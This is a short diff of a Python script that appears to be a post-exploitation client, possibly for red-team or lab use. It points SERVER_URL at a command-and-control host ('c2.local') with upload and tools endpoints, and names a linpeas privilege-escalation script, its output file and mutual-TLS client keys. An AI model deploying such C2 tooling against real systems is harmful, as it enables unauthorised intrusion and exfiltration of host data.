@@ -3,7 +3,7 @@ import subprocess
 import os
 from pathlib import Path
 from datetime import datetime
-SERVER_URL = "https://127.0.0.1"
+SERVER_URL = "https://c2.local"
 UPLOAD_ENDPOINT = "/upload"
 TOOLS_ENDPOINT = "/tools"
 filename = "linpeas_small.sh"
@@ -11,7 +11,6 @@ now = datetime.now()
 output = "Privesc_output" + now.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
 BASE_DIR = Path.cwd()
 keys_dir = BASE_DIR / "keys"
-
 CLIENT_CRT = next(keys_dir.glob("[!c][!a]*.crt"))
 CLIENT_KEY = next(keys_dir.glob("*.key"))
 CA_CERT = keys_dir / "ca.crt"
